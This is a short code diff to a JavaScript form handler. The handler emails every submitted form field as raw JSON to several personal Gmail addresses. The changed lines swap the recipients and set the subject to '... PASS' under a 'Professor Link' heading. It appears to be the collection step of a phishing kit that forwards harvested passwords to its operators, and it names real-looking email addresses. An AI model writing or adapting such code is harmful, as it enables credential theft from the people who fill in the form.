@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,content.emmaronnie.ads@gmail.com",
-      subject: "Ali Ahmed PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,ma3762953@gmail.com",
+      subject: "MEER M PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
